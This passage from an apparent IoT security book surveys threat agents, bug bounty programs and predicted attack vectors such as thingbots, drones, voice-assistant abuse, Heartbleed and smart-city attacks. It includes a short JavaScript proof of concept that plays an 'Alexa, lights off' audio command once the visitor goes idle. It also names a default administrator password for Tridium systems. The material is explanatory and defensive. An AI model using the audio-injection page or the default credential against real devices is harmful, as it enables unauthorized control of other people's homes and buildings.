feel good about being able to demonstrate loopholes. Companies such as Tesla pay the
price of brand damage nonetheless. Current and potential car owners may consider
other car manufacturers after having read about this attack in the media.
In previous chapters, we’ve seen that Tesla uses its always-on 3G cellular connection to
receive and install software updates that can affect the physical functionality of the car.
Owners and potential buyers are likely to question Tesla’s ability to protect their infra‐
structure from simple social engineering attacks such as these and be concerned about
danger to their physical safety should attackers abuse situations like this to effect the
functionality of their cars that may result in an accident. Competitors to Tesla may use
this situation to lure car buyers towards their products.
From the perspective of IoT, cloud platforms that are relied upon by endpoint devices
are likely to be a target by vandals. Imagine if a vandal were able to social engineer the
domain registrar for the SmartThings platform to re-route traffic through his or her
systems. A compromise such as this could allow the vandal to have all smoke detector
alarms powered by SmartThings to go off at the same time. Another scenario could
involve an audio file being broadcast on a particular manufacturer’s baby monitor
around the world. IoT vendors must make serious note of this threat agent and make
sure they have thought through monitoring requirements that can help them detect
attacks against their cloud platforms and against other partners (such as domain reg‐
istrars) they rely upon.
Bullying
According to the 2013 Youth Risk Behavior Surveillance Survey, 15% of high school
students in the United States between grades 9 and 12 were bullied in the past year.
Given the prevalence of technology in the lives of kids today, cyber bullying can happen
at any time and be perpetrated by anyone. It can be difficult to trace the source of such
bullying since messages and images can be posted on social media sites anonymously
or using a fake identity. Cyber bullying leads to lower self esteem and health problems
for the victim.
Various government agencies have come together to create a website against bullying,
including cyber bullying, to promote awareness of the issue and to provide a mechanism
to seek help: http://www.stopbullying.gov/cyberbullying/.
Ryan Patrick Halligan, hanged himself at the age of 13 as a result of cyber bullying. Ryan
was bullied in school because of his learning disabilities and was teased about an ongoing
rumor that he was gay. He became friends with a girl who expressed interest in him via
instant messaging. She later told him he was a “loser” in front of a group of kids at school.
Ryan began communicating with a friend on instant messaging and they both exchanged
ideas on how to commit suicide based on information they found online. Ryan sent a
message to this friend stating that he had been seriously contemplating suicide and killed
himself two weeks later. Ryan’s father lobbied for legislation in the state of Vermont and
Abuse Cases in the Context of Threat Agents 
| 
259

successfully persuaded the state government to enact a Suicide Prevention Law (Act
114). Other states have also pushed to enact laws against cyber bullying based on Ryan’s
story.
Unfortunately, there are many other stories such as Ryan Halligan’s, and the prominence
of cyber bullying is bound to increase given the amount of access children have to mobile
devices and social media platforms. The cases we see now usually leverage laptops,
mobile phones, email, instant messaging, and Facebook. IoT devices such as lighting,
connected door locks, and security systems can and will be leveraged by perpetrators
to commit bullying. From the consumer angle, parents will have to become aware of
how connected devices in their homes may be abused and do their best to monitor their
kids’ behavior and access to these devices.
Product manufacturers should also think through possible ways they can allow parents
to configure devices that are used by kids to alert them of suspicious activity. For ex‐
ample, we’ve seen how IoT door locks can allow users to grant other’s access to their
homes via a companion iPhone app. Kids who use their iPhones to unlock their home
whens they return from school should not be allowed to give others access to their
homes. Access to certain IoT devices can also be limited based on time and the GPS
location of the child, assuming he or she has their own smart phone that can track this
information.
Ultimately, technology can put children at risk and promote acts such as bullying, but
it can also be leveraged to monitor and promote safety. These are important issues that
designers of products should think through to make sure they are promoting kids to
lead safer and healthier lives while taking into account real threats such as cyber bullying.
Predators
There have been many unfortunate cases of children been lured and sexually abused by
predators who use online chat forums and instant messaging to find and communicate
with minors. Similar to bullying, abusers are bound to leverage technology that will
include IoT devices to get in touch with and communicate with minors.
Device manufacturers have a profound responsibility to encourage parental control
features in products where appropriate so that children are protected from suspicious
activity as well as a mechanism for the parents to be alerted when such activity is de‐
tected. One example of this is the ability of parents to monitor and control applications
that are installed on Smart TVs that may allow children to communicate with strangers.
As with the other threat agents, the designers of products should think through who
their target audience may be and embed methods for parents to lock down functionality
if their product is likely to be used by minors.
260 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Bug Bounty Programs
Tinkerers and security researchers often uncover security vulnerabilities by investing
their own time and resources. Sometimes vulnerabilities are discovered by accident, yet
in most situations the researchers get a thrill out of uncovering security lapses. In many
cases, the researchers want to do the right thing and report the issue to the product
vendor. Some companies have done a good job of advertising how researchers may
contact them to report security vulnerabilities, but many companies do not advertise
how they wish security issues be reported to them. This often causes researchers to
contacting customer support, which may not be equipped to route the information to
the right individuals.
In 2013, a researcher tried to report a security issue to Facebook that allowed anyone to
post on anyone else’s Facebook page (even if they were not friends). The researcher
actually reported the issue by following instructions on Facebook’s own vulnerability
reporting process, but the Facebook security team responded with “sorry this is not a
bug”. The researcher then posted details of the vulnerability on Mark Zuckerberg’s
(CEO) Facebook profile. Within minutes, the security engineering team at Facebook
contacted the researcher and worked with him to understand and fix the issue.
Companies such as Microsoft have set up bug bounty programs that pay researchers up
to $100,000 US dollars depending upon the severity of the issue. The case for such a
high reward is that the sophisticated research done by individuals who submit infor‐
mation to bug bounty programs would have cost Microsoft the same amount or more
to uncover themselves. Categorizing the awards based on severity easily aligns with
lowering the risk for the company and its shareholders.
There are also companies such as HackerOne (Figure 7-32) that facilitate and coordinate
bug bounty programs. A company can join the program and have researchers report
security issues using the HackerOne website. HackerOne claims that they will not look
at the actual vulnerability being reported since that is private communication between
the researcher reporting the issue and the company being reported to. Once the issue
is resolved, HackerOne can help the company disclose the vulnerability publicly.
Bug Bounty Programs 
| 
261

Figure 7-32. Recent bug bounties paid to researchers on HackerOne
It is terribly important that IoT vendors clearly establish a mechanism for researchers
to submit vulnerabilities. Without a clear process, there is little incentive for researchers
to spend time reporting issues. Even though not all company pay bounties, it makes
business sense to do so because it offers incentive to the researcher and lowers the
probability of the issue becoming public before it is fixed, and this can put customer
information, safety, and the revenue of the business at risk.
Conclusion
The littleBits platform let us quickly and easily design our prototype SMS doorbell. We
were able to leverage the IFTTT platform to gain the ability for our device to send SMS
messages. Within moments of being done with our platform, we were able to uncover
security issues relating to WiFi security, command execution on the device, and con‐
cerns with the persistence of the access token used by cloudBits to authenticate and
authorize queries and commands. Even though the littleBits platform is only designed
to help with initial prototyping, it is also a good way to uncover security concerns early
on. As we’ve learned, it is easier and cheaper to implement countermeasures early on
rather than to try and bake security in at a later stage.
262 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

We also looked at ways people could potentialy tamper with hardware-based debug
interfaces to obtain access to functionality that may compromise the integrity or con‐
fidentiality of the product. These situations can put users of the entire product line at
risk, such as in the case of the LIFX lighting system that exposed a universal symmetric
encryption key found in all of their devices.
It is also extremely important to think through how different threat agents may want to
abuse vulnerabilities. For example, a disgruntled employee working within customer
support with access to the location of connected cars may want to expose GPS data of
famous celebrities that own his or her employee’s car to tarnish the reputation of the
employer. On the other hand, hacktivists may want to target IoT devices owned by
specific individuals who are against their political agenda to cause disruption in services
and to expose private information that may embarrass the targets.
The architecture and design of connected devices are also bound to be of interest to
tinkerers and security researchers. It is vital for IoT manufacturers to provide a clearly
advertised process for individuals to report security issues, along with any applicable
reward that may be paid upon verification. In most cases, the cost of the reward is less
than the price companies have to pay in terms of loss of revenue arising from the negative
effect to their brand and the loss of their customer’s privacy and trust.
Conclusion 
| 
263


CHAPTER 8
Securely Enabling our Future: A
Conversation on Upcoming Attack Vectors
We’ve seen new attack vectors and threat agents come into the technology landscape
since the dawn of the Internet. Many of the threats have evolved in a fairly predictable
way. But because the world around us has come to rely upon inter connected devices at
an ever increasing rate, it’s important for us to ponder the threats to our future.
So far, we have taken a look at vulnerabilities and security principles pertaining to spe‐
cific devices. We’ve learnt a lot about the state of security in IoT devices in the consumer
market. We know the things we are doing wrong today that we need to improve upon
to securely enable the devices of the future.
Based on our knowledge of the evolving threat landscape as well as vulnerabilities that
have and are plaguing our computing systems and IoT devices, we stand on good ground
to be able to predict upcoming scenarios that may come to pass given the new sets of
abuse cases that come along with the use cases served by IoT products. In this chapter,
we will predict plausable scenarios of attacks based upon our understanding of how IoT
devices will serve our needs in the future.
The Thingbots Have Arrived
Botnets comprise of a group of workstations and laptops that have been compromised
and are controlled by the botnet owner. Most often devices are infected by malware sent
to the victim via email, by using a phishing website, or by software worms that exploit
a vulnerability. A single botnet can comprise of thousands of devices giving the botnet
owner tremendous power to launch denial of service attacks on other networks by
directing traffic from infected machines toward a specified target, thereby overloading
it from being able to serve legitimate requests. Botnets are also used to steal private
information such as credit card numbers and credentials for bank and email accounts.
265

As discussed in the previous chapter, in 2014, a research firm discovered over 750,000
phishing and spam messages that were sent from more than 100,000 household devices,
including televisions, wi-fi routers, and fridges. The term “thingbots” is being used in
the cybersecurity research industry to describe botnets that include infected IoT devices
that can also be leveraged to launch attacks and steal private information.
Thingbot owners are likely to leverage the ability of IoT devices to steal information
they may not have had access to previously, such as capturing private conversation from
infected Smart TVs, or the ability to control locks and lighting in thousands of homes.
As more IoT devices start to come online, attacks spawned by thingbots are only going
to increase and threat agents are going to have increased access to our private infor‐
mation as well as the ability to cause physical disruptions in our lives. This means that
the categories of IoT related vulnerabilities discussed in this book will become even
more of an emergency as we look into our future.
The Rise of the Drones
Unmanned Ariel Vehicles (UAV), known in the mainstream as a “drones”, are aircrafts
without a human pilots on board. There are various types of drones that range from
larger, military grade ones to drones that are used for recreational purposes such as
photography.
At the BlackHat conference in Singapore in 2014, researcher Glenn Wilkinson unveiled
a proof of concept tool called Snoopy that uses an onboard computer, a GPS unit, a
GSM cellular unit for network connectivity, and attached video cameras with a quad‐
copter drone to capture wireless network traffic and to follow targets in a defined area.
In addition to WiFi, the tool also leverages Bluetooth and RFID network traffic to track
devices and their owners.
Snoopy works by tracking network probes from devices such as smart phones that are
constantly searching for WiFi networks they have previously associated with. The
Snoopy drone then offers a WiFi network with the same name as the one being probed.
When a smart phone joins this network, Snoopy proxies the network traffic and there‐
fore can be used to capture data being transmitted by the phone. In addition to phones,
Snoopy can also capture data from devices such as pacemakers that use WiFi, as well as
fitness devices and smart cards.
Snoopy is designed to capture network data and transmit it to a remote server so the
owner of the drones can analyze data in one place since the tool can be spanned across
multiple drones that may be spread across a city. For areas where there is spotty cellular
coverage, a single drone can be deployed to hover and capture network traffic while
another drone can be sent over periodically to collect the captured data and bring it
back to the attacker. This tool comes with the ability to use an accelerometer to detect
if the drone has been captured by a third party. In that case, Snoopy can be configured
266 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

to self-destruct by erasing the contents of the hard drive on the computer attached to
the drone.
Apart from researchers being able to demonstrate how UAVs can be leveraged to capture
devices from smart phones and potentially life sustaining devices such as pacemakers,
it’s easy to imagine how drones can be leveraged by heavily funded groups such as state
governments and sophisticated criminal gangs. As UAVs continue to evolve in the mili‐
tary and the private space, it is quite probable that they will be used by a variety of agents
to gain access to devices and networks. In this book, we have seen many different ex‐
amples of IoT devices that require no authentication or authorization if the attacker has
access to the local WiFi network. Since many popular IoT devices are already in exis‐
tence, they are going to be a juicy target for individuals and well funded criminal agen‐
cies whose aim is to capture data and possibly disrupt physical safety.
Cross Device Attacks
Many people utilize a slew of computing devices on a daily basis: smart phones, personal
workstations, employer issued laptops, and tablets to get their professional and private
work done. Quite often, data is synced across multiple devices so the user has access to
his or her information regardless of what device is being used. For example, the user
may backup his or her smart phone on to their personal laptop. Another example is
using a service such as iCloud to sync documents, application settings, and contacts
across devices. This creates a situation where an attacker may be able to leverage one
device that has been compromised to access information stored on another device or
to access information that is synced using a cloud-based service.
Imagine a situation where a physician stores information about a patient in a document
hosted on DropBox. If the physician’s desktop were to be compromised using a phishing
attack, the attacker could modify contents of the document to alter the dosage of a
medication. This document would have its updates synced across other devices, such
as a tablet, that the physician may use while on duty. In this situation, the doctor’s tablet
may be configured to have full disk encryption and additional security controls deployed
by his or her employer. Yet these controls would have no merit since the document was
compromised on the doctor’s desktop at home and automatically synced to the same
DropBox account on the physician’s tablet. This illustrates how the compromise of a
single device in a user’s ecosystem can be leveraged to negatively affect the integrity of
data on other devices.
Local backup files of smart phones and tablets that may be stored on workstations and
laptops are also a juicy target for attackers. In Chapter 4, we analyzed the token called
access_token by the SmartThings iOS App which was issued by the server upon suc‐
cessful authentication and valid for 18,250 days. Should the user’s workstation or laptop
be compromised, an attacker can potentially steal the backup file of the user’s smart
Cross Device Attacks 
| 
267

phone or tablet and collect the access_token which is likely to work since it is valid for
so long.
The amount of devices used by a single user will increase the attack surface. Attackers
who have access to a single device will be able to steal private information and influence
data synced across devices, as well as steal information that can be used to command
IoT devices. Users, system administrators, and IoT device and application designers
should think through the ecosystem of devices that users are likely to have, along with
the threat agents, to architect possible solutions to mitigate these potential scenarios.
Hearing Voices
In 2007, Microsoft came under fire for a security hole in the speech-recognition com‐
ponent of their newly released Windows Vista operating system. A malicious website
could simply play an audio file commanding the computer to delete files and empty the
recycle bin, and the operating system would readily comply. An attacker could alter‐
natively email the audio file to the victim and lure him or her to play it. Microsoft played
down the issue, stating that the victim would have to have their microphone placed next
to the speaker so the malicious set of audio commands are clearly interpreted by Vista.
Furthermore, Microsoft stated that the user would likely recognize the attack because
they would hear the audio instructions play. This is assuming the user is in the vicinity
of their computer should someone exploit this issue.
Perhaps one of the reason this issue wasn’t taken very seriously by the users is that not
many people leverage the speech function in desktop and laptop computers (except for
individuals affected by impairments and related difficulties). When Vista was released
in 2007, users primarily used the keyboard, mouse, and trackpad as their modes of input.
With the growing popularity of intelligent. voice-operated personal assistant services
like Siri and Cortana, this is changing. Users are starting to enjoy and find value in
commanding their smart phones and computers with their voices.
Jumping in on the digital personal assistant bandwagon, Amazon released a product
called Echo (Figure 8-1) which is primarily voice operated along with a companion
smart phone App to configure it.
268 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

Figure 8-1. The Amazon Echo
Hearing Voices 
| 
269

The device is a 9 inch tall speaker and a microphone that has its default wake word set
to “Alexa”. Just like Siri, you can command the Echo to tell you the weather by saying
“Alexa, what is the weather like today?” or to ask trivia questions such as “Alexa, how
tall was Michael Jackson?”.
The Echo can also be configured to turn on or off a selection of hue lightbulbs (discussed
in Chapter 1). As with the hue iOS app, the Echo app can access the hue bridge once
you press the button on the bridge to prove physical ownership. It is possible to specify
a selection of hue lights into a specific group called “lights,” as shown in Figure 8-2.
270 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

Figure 8-2. 17 hue lightbulbs under the group called “lights”
Hearing Voices 
| 
271

At this point, the user can say “Alexa, turn off lights” and the Amazon Echo will dutifully
cause all 17 lights to go off. Learning from the Microsoft Vista security issue, we can
easily simulate a proof of concept scenario where a website plays an audio file instructing
Alexa to turn off the lights. Consider a website with the following JavaScript:
<HTML>
  <BODY>
   <SCRIPT>
    var IDLE_TIMEOUT = 60; //in seconds
    var _idleSecondsCounter = 0;
    document.onclick = function()
    {
     _idleSecondsCounter = 0;
    };
    document.onmousemove = function()
    {
     _idleSecondsCounter = 0;
    };
    document.onkeypress = function()
    {
     _idleSecondsCounter = 0;
    };
    window.setInterval(CheckIdleTime, 1000);
    function CheckIdleTime()
    {
     _idleSecondsCounter++;
     if (_idleSecondsCounter >= IDLE_TIMEOUT)
     {
      var audio = new Audio('alexa_lights_off.m4a');
      audio.play();
      _idleSecondsCounter = 0;
     }
    }
   </SCRIPT>
  </BODY>
</HTML>
This JavaScript (slightly modified from the original version available from http://stack
overflow.com/a/13246534) plays the audio file alexa_llights_off.m4a when the
browser notices that there has been no mouse and keyboard movements for 60 seconds.
The audio file contains the words, “Alexa, lights off”. This rudimentary proof of concept
shows how an external website can use audio assistants like the Amazon Echo to influ‐
ence connected devices.
272 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

Back in 2007, the Windows Vista security issue was not of particular interest to the
cybersecurity community since the impact and the probability of an attacker being able
to pull it off was low (the voice-activation feature had to be turned on and the micro‐
phone needed to be next to the speaker). Today, however, more and more people are
relying on audio-based personal assistants such as the Echo. What makes this attack
vector of particular concern is that we are going to depend upon devices like the Echo
to command IoT devices that could have a physical impact on our safety, such as lights
going off.
The Amazon Echo also works with IFTTT recipes and can command the WeMo light
switch. This makes the Echo a powerful device that is able to turn off appliances and
lighting at homes. The Echo only allows the user to select “Alexa” or “Amazon” as the
“wake word” which needs to be uttered as the first word in every command so it knows
the user has intended it for the device. Our rudimentary proof of concept would have
been thwarted if Amazon required users to select a unique wake word. Of course, theat
agents such as neighborhood bullies would probably be able to find out from the local
social network what the unique wake word is set to, but it would substantially limit
threat agents who are completely remote and may not have access to that information.
Designers of products such as the Echo should correlate malicious activity that leverages
audio as a channel of implementing attack vectors since the product is primarily de‐
signed to communicate using audio. The speech-recognition security hole may not have
been deemed impactful in the past, but product designers and users need to be extremely
cognizant of increased avenues of abuse using audio channels as we continue to increase
our reliance on assistants such as the Echo.
IoT Cloud Infrastructure Attacks
Devices that offer Internet connectivity require supporting cloud infrastructure. We’ve
seen how the Hue lighting system can be controlled from anywhere in the world using
the iOS app. We’ve seen how the WeMo baby monitor can be accessed remotely through
supporting infrastructure hosted by Amazon’s cloud service. We’ve seen how the Tesla
Model S maintains a persistent cellular connection with Tesla’s infrastructure to obtain
over-the-air updates, send diagnostics, and be controlled using the iOS app. Such reli‐
ance of IoT devices upon cloud infrastructure makes it a juicy target for abuse.
In late 2014, hackers compromised iCloud accounts of several celebrities and exposed
their private nude photographs and videos to the public. They tried various combina‐
tions of passwords for the target iCloud accounts until they guessed the right ones. Since
most iPhone users elect to sync their photographs and videos across devices using the
iCloud service, the attackers were able to obtain the images upon logging in.
Although no actual vulnerability in the iCloud service was discovered to have been
exploited, the reason attackers were easily able to obtain access was that certain func‐
IoT Cloud Infrastructure Attacks 
| 
273

tionality of the service did not implement controls to lock out accounts if too many
unsuccessful attempts were made in a given period of time.
This celebrity breach demonstrates how the use of a static password makes it easy for
potential attackers to gain access to private information. IoT devices, such as the Tesla
Model S, also use static passwords that can be easily guessed to obtain access to cars,
allowing attackers to track vehicles, unlock them, and even start them and drive away.
In addition to the cloud infrastructure implemented by the IoT device manufacturers
themselves, we have platforms such as IFTTT and Apple’s HomeKit that will be included
in the proposed attack surface. We’ve already seen how easy it is to connect our online
spaces such as email and social networks with IoT devices such as lightbulbs and door
locks. Compromising someone’s IFTTT account gives the attacker control over all of
the virtual and physical services tied to the victim’s account.
Apple’s HomeKit service that is built into iOS is another example of a platform that will
be of interest to attackers. The HomeKit service allows IoT device manufacturers to
seamlessly work with Apple devices, even allowing the users to control their devices
remotely. The goal of HomeKit is to allow users to easily set up new devices and then
control them using Siri. Other big software companies like Google and Microsoft are
also implementing frameworks like HomeKit to enable the emergence of consumer-
based IoT devices. Apple has done a good job of setting clear guidelines that developers
who use HomeKit must not leverage the data for advertising and data-mining. Frame‐
works and services such as this will become popular since they allow users to seamlessly
interact and control their IoT devices. As such, cybersecurity researchers and malicious
attackers (including disgruntled employees who have access to these systems) will also
be drawn to potential vulnerabilities in such services that can be exploited to gain access
to data available from various devices in the victim’s home.
In the recent past, breaches of cloud services have contributed to the loss of privacy for
victims and financial gain for attackera. In the near future, attackers will look into ex‐
ploiting cloud services to gain access to and abuse the functionality of IoT devices to
further invade our privacy and potentially compromise our physical safety.
Backdoors
There have been various reports that the NSA may have intercepted devices such as
network routers and planted backdoors in them. (A backdoor is a software or hardware
modification of a device that allows the modifier to monitor and control the device
remotely.) American government agencies have aggressively lobbied for popular hard‐
ware and software manufacturers such as Apple, Google, and Microsoft to build in
mechanisms that would allow low enforcement agencies to monitor and obtain data
from personal devices such as smart phones.
274 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

Besides United States based government agencies, the Chinese government is routinely
accused of building backdoors into hardware and software produced in that country.
Given that China is a major hub of hardware production, many electronic companies
have major supply chain presence there. The Chinese government, in return, recently
issued new regulations requiring foreign companies to reveal source code and build
backdoors into software and hardware sold to Chinese banks.
The amount of power that can be exerted by a threat agent who is able to influence
installing a backdoor into an IoT device is clear. The one thing to note is that competing
attackers and threat agents can and will leverage backdoors once the knowledge of their
existence is made public.
The Lurking Heartbleed
Heartbleed is a flaw in the OpenSSL library that can be exploited remotely to gain access
to memory, including cryptographic keys and user credentials. OpenSSL is a popular
library that is used by millions of devices to implement the Transport Layer Security
(TLS) protocol to securely encrypt electronic communications.
Heartbleed was announced to developers on April 1, 2014, and at the time of disclosure,
about 17% (i.e. around half a million) of Internet facing web servers were vulnerable to
attack. Bruce Schneier, a well known security expert, described Heartbleed as a “cata‐
strophic” issue given how easily it can be abused to steal information by a remote at‐
tacker.
In addition to workstations, IoT devices such as the Nest thermostat also use OpenSSL.
Nest released an update for their thermostat product that was affected by the security
issue and also advised their customers to change their Nest passwords just in case they
may have been compromised due to the issue (Figure 8-3).
The Lurking Heartbleed 
| 
275

Figure 8-3. Nest support website detailing the Heartbleed security issue
OpenSSL is widely used in embedded devices beyond the Nest thermostat. Heartbleed
demonstrates to us the potential catastrophic nature of a remotely exploitable vulner‐
ability that can suddenly put millions of IoT devices at risk because they utilize common
source code that has a bug in it. Another issue to keep in mind here is that IoT devices
without the ability to update firmware and client software will remain vulnerable to
critical issues such as this for their lifetime, thereby putting the privacy and safety of
their consumers in danger.
Diluting the Medical Record
Vulnerabilities that exploit life-sustaining, hospital-grade devices have been proven.
Researcher Jerome Radcliffe has detailed how he was able to use radio communication
to remotely instruct a insulin pump to change the dosage being administered. This
attack could be abused by a malicious entity within wireless range to kill a patient.
276 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

Consumer devices such as the Fitbit activity trackers are also gaining attention from the
medical community. Doctors find it useful to obtain granular information about pa‐
tients, such as their blood pressure, the amount of daily exercise they get, and other
vitals that can influence prescribed dosages and treatments. There is consensus in the
medical and technology communities that data from personal activity trackers will be
incorporated into patients’ medical records, giving doctors greater visibility into the
health of their patients in addition what they are able to measure in medical facilities.
Figure 8-4 shows a screenshot of BPM (Beats Per Minute) data collected by the Apple
Watch using the IOS HealthKit functionality. This information can be extremely useful
to medical professionals to help diagnose a patient.
Diluting the Medical Record 
| 
277

Figure 8-4. Heart-beat data collected by the Apple Watch
278 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

Government regulations and required health approvals will delay the convergence of
data collected from personal devices into medical records, yet it is likely that it will
eventually happen. Since devices such as the Fitbit and the Apple Watch are able to
collect this information, it is valuable to begin to have a conversation on potential abuses
of such information. One potential scenario for abuse in this case is the ability of a
malicious entity to alter the stored information that is then relied upon by a medical
professional. For example, tampering with an individual’s BPM statistics can result in
a physician prescribing incorrect dosages for high or low blood pressure, which can
potentially have significant negative impact to the patient’s health. In addition to mon‐
itoring activity, the iPhone lets users create an emergency Medical ID (Figure 8-5) that
contains vital information such as known medical conditions, medications, blood type,
and emergency contacts. This information is available even when the phone is locked
so that medical professionals can access it in an emergency.
Diluting the Medical Record 
| 
279

Figure 8-5. Emergency Medical ID Feature on the iPhone
Features such as the iPhone’s Medical ID will undoubtedly help save lives by giving
doctors vital information in case of emergencies where the patient is unconscious or
unable to communicate. This information can also put people’s lives at risk if the iPhone
280 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

is compromised and the information is purposefully altered. The feature can also be
abused by acquaintances who may have physical access to the iPhone and want to alter
the information in unfortunate cases involving bad family dynamics and other psycho‐
logical factors.
Frameworks such as Apple’s ResearchKit are being leveraged by medical researchers to
use smart phones and smart watches to collect data and perform research on diseases
and ailments. Stanford Medicine is leveraging ResearchKit to perform a global cardio‐
vascular research study using the MyHeart Counts app. Heartbeat data collected from
the Apple Watch is sent to a remote database an used to further research. Here is a note
from the project’s privacy policy:
All information that is collected through the App will be sent to a secure data server run
by Sage BioNetworks (“Sage”), a non-profit research organization. Sage will replace the
direct identifiers listed above (your name, email address, and date of birth) with a code
to help protect your identity—Sage will encrypt the direct identifiers and store them
separately. Because the data are coded, researchers using the data will not be able readily
to identify which information pertains to you. Stanford researchers will, however, main‐
tain your consent and personal information and retain the ability to re-identify the in‐
formation if doing so is needed for research integrity purposes or legal purposes, and
they may share re-identified information with others at Stanford who need to see such
information to ensure that the research meets legal, regulatory or institutional require‐
ments.
In this case, information collected is sent to a remote data server. It is then replaced with
a random identifier token so researchers using the data will not be able to identify the
individual the data is collected from. However, another database is maintained that can
be leveraged to re-identify the individual should Stanford researcher decide or need to
do so. This is a solid example of how health data collected from sensors attached to our
bodies is going to be leveraged and possibly distributed across cloud platforms around
the world. The security of these platforms, as well as what access the researchers them‐
selves have in terms of identification purposes, will define and possibly contribute to
privacy violations that, until now, have been limited to traditional medical records stored
by hospitals and dotor offices.
The Data Tsunami
Most people who use Facebook or Google have noticed targeted ads with a high creep
factor, i.e. ads on these platforms are tailored to precicely suit people’s previous search
queries, email contents, instant messages, and social network dynamics.
Services such as Google now go through your data to suggest events and even offer to
check you in for your flights based on an email copy of your itinerary. The world of IoT
will bring in additional sensor and behavior-based data that will be valuable to social
network companies and extremely useful for marketing. We are likely to see advertise‐
ments targeted to us for blood-pressure medications based on our BPM readings from
The Data Tsunami 
| 
281

our smart watches or even anti-insomnia drugs based on data collected about what time
we usually turn off our IoT-based lighting system.
As people start to consume IoT devices that they want to integrate and automate using
platforms and frameworks provided by companies such as Google and Apple, infor‐
mation collected from various sensors will be available and used for marketing and
stored across multiple cloud architectures. This data will be a gold-mine for malicious
agents who have previously been limited to online platforms such as email and social
networking. Besides privacy, the ability of a threat agent to tamper this information may
have health or physical safety implications in cases where the altered information is
consumed by IoT devices. It is likely that such violations of security and privacy will
enrage customers, who will demand ability to granularly track what data is being col‐
lected, how it’s being used, and the ability to opt out.
Targeting Smart Cities
Researcher Billy Rios hacked into the building-control system of an Australian Google
office. The building was found to use the Tridium Niagara AX platform that allows
administrators to remotely control physical security alarms, physical access, water tem‐
perature, as well as heating and air conditioning. They were able to obtain access by
using the default administrator password of “anyonesguess”. This password was stored
in a configuration file that the researcher obtained due to a vulnerability in the system
that exposed this information to unauthenticated users. Tridium systems are popular
around the world, and according to Rios, he was able to use the Shodan tool to locate
more than 25,000 such systems exposed to the Internet.
Besides industrial grade connected systems like those exploited by Rios, we are starting
to see consumer-grade IoT devices such as the ones explored in this book thus far. The
concept of the Smart City (also discussed in Chaoter 7) combines the use of industrial
grade and consumer grade IoT devices to effectively manage energy, healthcare, trans‐
port, and waste across a geographical location. Smart cities will use a combination of
industrial-grade connected devices (such as smart parking meters and traffic lights)
along with consumer-grade IoT devices installed in homes and directly configurable by
citizens (such as lighting, door locks, cars, that have been the focus of this book). Re‐
searcher Cesar Currodo’s paper An Emerging US (and World) Threat: Cities Wide Open
to Cyber Attacks covers attack vectors against industrial-grade connected devices that
will support the upcoming emergence of the smart city. Currodo’s research and the
devices presented in this book will set the stage for attack vectors encompassing smart
cities based on various categories of interconnected devices and services.
Efforts by society to construct smart cities are likely to include a curated selection of
interconnected devices to provide for consistency and scalability. This brings the draw‐
backs of “monoculture” into the discussion. Much like in living species, the advantage
of monoculture includes low variability in genetics, which in turn requires lower re‐
282 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

sources to find medical cures for diseases since experimentation wouldn’t require the
analysis of a variety of specimens. The disadvantage of monoculture is that a new variant
of a disease can wipe out the entire population because it will equally infect every indi‐
vidual.
This logic can also be applied to computer systems and IoT devices: increased mono‐
culture will lead to lower costs and ease of interoperability, while increased variability
will lead to lesser chance of a malicious attack being able to compromise an entire smarty
city. There are areas of technology, such as the TCP/IP protocol, that are so fundamental
to electronic communication that it may make offer no advantage to create additional
protocols to decrease the monoculture aspect. The influence of monoculture in systems
is an ongoing topic of discussion and debate in the cyber-security community. It has
definite applicability to the concept and emergence of the smarty city, and it is ultimately
dependent upon the total cost of implementation versus perceived risks that may be
introduced.
Inter Space Communication Will be a Ripe Target
One of humankind’s greatest endeavors is our ongoing quest to colonize Mars. NASA
plans to send humans to Mars by the 2030s. Their engineers and scientists are working
hard to develop the technologies astronauts will use to one day live and work on Mars,
and safely return home from the next giant leap for humanity.
Establishing communications between Earth and Mars will be critical in making sure
that space agencies are able to successfully transmit crucial data related to the mission
and that humans are able to communicate with each other. NASA is aware of the im‐
portance of securing communications during space missions:
“Reliable communication between ground and spacecraft is central to mission success,
especially in the realms of digital communication (data and command links). Seen in the
light of recent events, these communication links are vulnerable to malicious intrusion.
If terrorists or hackers illegally listen to, or worse, modify communication content, dis‐
aster can occur. The consequences of a nuclear powered spacecraft under control of a
hacker or terrorist could be devastating. Therefore, all communications to and between
spacecraft must be extremely secure and reliable.”
There are various projects that are underway to facilitate space communication more
efficiently. For example, NASA’s Optical Communications project is researching ways
to use light to transmit data.
Space communication protocols need be robust enough to withstand delays, disruptions
and disconnections in space. Glitches can happen when a spacecraft moves behind a
planet, or when solar storms and long communication delays occur. It takes from 4 to
20 minutes to transmit data between Mars and Earth, so NASA’s systems have to tolerate
such delays. Therefore, instead of using TCP/IP, NASA has developed a protocol called
Disruption-Tolerant Networking (DTN) that is able to work seamlessly during delays
Inter Space Communication Will be a Ripe Target 
| 
283

and loss of connectivity. DTN is designed to incorporate cryptography and key man‐
agement, signifying that space agencies are taking steps to make sure security is built in
to the design of space communication protocols.
Elon Musk’s SpaceX is planning on launching 4,000 low-orbit satellites to provide global
Internet access on planet earth. SpaceX plans to extend this network of satellites to
include communications with satellites on Mars when its mission to send human to
Mars comes to fruition.
It is easy to imagine how important communication is going to be to enable critical and
risky space missions. Rockets and satellites (and other objects relevant to the mission)
are “things” that are going to be available and accessible on space communication in‐
frastructure. As NASA and SpaceX move forward with deploying a greater number of
satellites to facilitate networks in space, their architecture will be a ripe target for a many
threat agents. Terrorists and competing nation states are likely to attempt to exploit
vulnerabilities that may be present in network protocols to steal intellectual property
and to disrupt space missions. Such a security breach could result in the loss of human
lives or even the failure of humankind to populate other planets. This is going to be an
important area for security researchers to contribute to in order to make sure we are
building our space communication infrastructure securely from the ground up.
The Dangers of Superintelligence
Irving John Good, a British mathematician who worked as a cryptologist at Bletchley
Park with Alan Turing, is often quoted when discussing the perils of machines achieving
greater intelligence than humans:
